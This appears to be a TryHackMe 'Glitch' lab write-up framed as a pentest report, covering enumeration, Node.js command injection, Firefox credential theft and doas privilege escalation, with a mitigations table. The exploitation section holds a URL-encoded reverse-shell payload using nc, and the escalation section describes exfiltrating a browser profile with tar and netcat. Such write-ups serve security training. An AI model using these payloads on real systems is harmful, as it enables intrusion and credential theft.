[GLITCH](https://tryhackme.com/room/glitch)

**Date:** [23/05/2025]  
**Difficulty:** [Easy]  
**Objective:** [Exploit a vulnerable web application, extract stored credentials, escalate privileges, and gain root access on the target machine.]

---

## Table of Contents

- [1. Summary](#1-summary)
- [2. Methodology](#2-methodology)
- [3. Reconnaissance](#3-reconnaissance)
- [4. Enumeration](#4-enumeration)
- [5. Exploitation](#5-exploitation)
- [6. Privilege Escalation](#6-privilege-escalation)
- [7. Post Exploitation](#7-post-exploitation)
- [8. Flags / Proof](#8-flags--proof)
- [9. Mitigations](#9-mitigations)
- [10. Notes](#10-notes)

---

## 1. Summary

**IP/URL:** [10.10.230.208 ]  
**Service/Ports:** [80/HTTP]  
**Entry Point:** [Web token in localStorage and /api/items injection]  
**Privilege Escalation:** [Credential reuse via Firefox profile + doas misconfiguration]  
**Outcome:** [Root shell obtained, flags captured]  

---

## 2. Methodology

Following the PTES (Penetration Testing Execution Standard):
1. Reconnaissance  
2. Scanning & Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance

## Active
```
nmap -sS -sV 10.10.230.208 
```
```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
----

## 4. Enumeration
    Web: gobuster, wfuzz

    Commands:
    ```
    wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hc 404,400 http://10.10.162.38/api/items\?FUZZ\=1
    gobuster dir -u http://10.10.230.208 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ```

    
Findings:
```
    /img                  (Status: 301) [Size: 173] [--> /img/]
    /js                   (Status: 301) [Size: 171] [--> /js/]
    /secret               (Status: 200) [Size: 724]
```
```
    ID           Response   Lines    Word       Chars       Payload                                                                          
=====================================================================

000002370:   200        0 L      2 W        25 Ch       "cmd"    

```


/secret revealed when setting a custom token cookie value
JavaScript exposed /api/items and structure of app
cmd parameter injectable

----

## 5. Exploitation

    Parameter injection in /api/items?cmd=

    Tools: Burp Suite

    Commands:
 
    POST /api/items?cmd=require("child_process").exec("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E21%2E157%2E185%204444%20%3E%2Ftmp%2Ff") HTTP/1.1

     Reverse shell received as user

----

## 6. Privilege Escalation

    Method: 

    Stole Firefox profile via tar | nc
    Extracted passwords using firefox_decrypt.py


    Tool Used: LinPEAS

    Commands:
 
   Find / -perm -4000 2>/dev/null
   doas -u root /bin/bash


Escalated To: root

----

## 7. Post Exploitation

    User switch: user → v0id → root

    Found and read /root/flag.txt

    Firefox config showed .bash_history redirected to /dev/null (intentional hiding)

----

## 8. Flags / Proof

    User Flag: THM{user_flag_here}

    Root Flag: THM{root_flag_here}

    Other Credentials / Loot:

        Username: v0id

        Password: (extracted)

----

## 9. Mitigations

| Vulnerability              | Risk   | Suggested Mitigation                                    |
|----------------------------|--------|---------------------------------------------------------|
| Token-based access control | High   | Use proper session management and token validation      |
| Command injection via API  | High   | Sanitize and validate all user input                    |
| Firefox credential leakage | High   | Disable password saving, encrypt profiles               |
| doas misconfiguration      | High   | Restrict usage to authorized users only                 |

----

## 10. Notes

    Time spent: [e.g., 2 hours]

    Tools used: nmap, gobuster, sqlmap, linpeas, Burp Suite, etc.

    Lessons learned:
    Firefox profiles can be goldmines of credentials

    Always check for custom JS logic in CTF web apps

    doas is just as dangerous as sudo when misconfigured

    Tar + netcat = simple and powerful file exfil method
